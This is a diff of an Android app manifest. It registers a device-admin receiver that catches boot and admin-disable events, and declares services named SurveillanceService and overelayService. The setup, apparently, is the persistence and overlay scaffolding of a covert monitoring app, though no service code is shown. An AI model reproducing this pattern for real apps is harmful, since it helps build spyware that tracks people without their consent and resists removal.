@@ -25,13 +25,24 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <service android:name=".SurveillanceService"/>
-        <activity android:name=".ActionActivity"
-            android:launchMode="singleTop"/>
-        <service android:name=".overelayService">
+
+        <receiver android:name=".AdminReceiver"
+            android:label="@string/sample_device_admin"
+            android:description="@string/sample_device_admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data
                 android:name="android.app.device_admin"
-                android:resource="@xml/my_admin"/>
-        </service>
+                android:resource="@xml/my_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name=".SurveillanceService"/>
+        <service android:name=".overelayService"/>
     </application>
 </manifest>
